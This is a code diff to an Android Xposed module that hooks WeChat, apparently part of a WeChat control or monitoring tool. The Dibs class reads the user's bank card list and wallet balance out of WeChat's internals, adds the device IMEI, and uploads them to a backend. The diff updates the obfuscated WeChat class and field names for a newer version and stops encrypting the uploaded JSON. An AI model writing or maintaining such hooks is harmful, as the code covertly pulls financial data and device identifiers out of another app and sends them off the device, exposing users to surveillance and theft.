@@ -1,6 +1,7 @@
 package com.gentcent.wechat.zzk.model.wallet;
 
 import android.os.Looper;
+import android.util.Log;
 
 import com.blankj.utilcode.util.EncodeUtils;
 import com.blankj.utilcode.util.EncryptUtils;
@@ -47,15 +48,15 @@ public class Dibs {
 			WalletBean walletBean = new WalletBean();
 			walletBean.cards = Bankcard.getBankcards(lpparam);
 			walletBean.Dibs = -1.0d;
-			List<String> c = c(GsonUtils.GsonString(walletBean));
+			String contents = GsonUtils.GsonString(walletBean);
 			EnWalletBean enWalletBean = new EnWalletBean();
-			enWalletBean.Contents = c;
+			enWalletBean.Contents = contents;
 			enWalletBean.Imei = PhoneUtils.getIMEI();
 			UploadUtil.sendToBack(enWalletBean);
 		}
 	}
 	
-	public static List<String> c(String walletBeanJson) {
+	public static List<String> base64Encode(String walletBeanJson) {
 		String str2 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDkn2nxgBbMHe76fIDy1gngkbGNnLi7dA1O3oM3dMv8Z8Tf/6cwoSaQ1vJ9bZ8xkEOo+CEOe5NCXqDtEEyWmjK+eVgQKpWlwnclHNe2YjFjEp259W8M+JwQCBUv4r7Z9RPVqkmf2XD51Qf4kbK+6aT/DifWTPskZqyrJl9c9xXUUQIDAQAB";
 		int length = (walletBeanJson.length() / 50) + (walletBeanJson.length() % 50 != 0 ? 1 : 0);
 		if (length == 0) {
@@ -114,9 +115,9 @@ public class Dibs {
 				sb3.append("requestDataCallback error walletBean :");
 				sb3.append(GsonUtils.GsonString(walletBean));
 				XLog.d(TAG + sb3.toString());
-				List<String> c = c(GsonUtils.GsonString(walletBean));
+				String contents = GsonUtils.GsonString(walletBean);
 				EnWalletBean enWalletBean = new EnWalletBean();
-				enWalletBean.Contents = c;
+				enWalletBean.Contents = contents;
 				enWalletBean.Imei = PhoneUtils.getIMEI();
 				UploadUtil.sendToBack(enWalletBean);
 				th.printStackTrace();
@@ -124,20 +125,16 @@ public class Dibs {
 		}
 	}
 	
-	/* access modifiers changed from: private */
 	public static void sendWalletInfo(LoadPackageParam loadPackageParam) {
 		WalletBean walletBean = new WalletBean();
 		walletBean.cards = Bankcard.getBankcards(loadPackageParam);
-		StringBuilder sb = new StringBuilder();
-		sb.append(" requestDataCallback  cards :");
-		sb.append(GsonUtils.GsonString(walletBean.cards));
-		XLog.d(TAG + sb.toString());
+		XLog.d(TAG + "requestDataCallback  cards :" + GsonUtils.GsonString(walletBean.cards));
 		double dibs = getDibs(loadPackageParam);
 		walletBean.Dibs = dibs;
 		XLog.d(TAG + "requestDataCallback  walletBean :" + GsonUtils.GsonString(walletBean));
-		List<String> c = c(GsonUtils.GsonString(walletBean));
+		String contents = GsonUtils.GsonString(walletBean);
 		EnWalletBean enWalletBean = new EnWalletBean();
-		enWalletBean.Contents = c;
+		enWalletBean.Contents = contents;
 		enWalletBean.Imei = PhoneUtils.getIMEI();
 		UploadUtil.sendToBack(enWalletBean);
 		XLog.d(TAG + "sendWalletInfo money :" + dibs);
@@ -145,7 +142,7 @@ public class Dibs {
 	
 	public static double getDibs(LoadPackageParam loadPackageParam) {
 		try {
-			Object objectField = XposedHelpers.getObjectField(XposedHelpers.callStaticMethod(loadPackageParam.classLoader.loadClass("com.tencent.mm.plugin.wallet_core.model.q"), "cKk"), "sRV");
+			Object objectField = XposedHelpers.getObjectField(XposedHelpers.callStaticMethod(loadPackageParam.classLoader.loadClass("com.tencent.mm.plugin.wallet_core.model.t"), "dbh"), "uWd");
 			if (objectField != null) {
 				double longField = (double) XposedHelpers.getLongField(objectField, "field_wallet_balance");
 				if (longField > 0.0d) {
@@ -156,11 +153,7 @@ public class Dibs {
 				XLog.d(TAG + "getDibs  card is null:");
 			}
 		} catch (Exception e) {
-			StringBuilder sb = new StringBuilder();
-			sb.append("getDibs  e:");
-			sb.append(e.getMessage());
-			XLog.d(TAG + sb.toString());
-			e.printStackTrace();
+			XLog.d(TAG + "getDibs  e:" + Log.getStackTraceString(e));
 		}
 		return 0.0d;
 	}
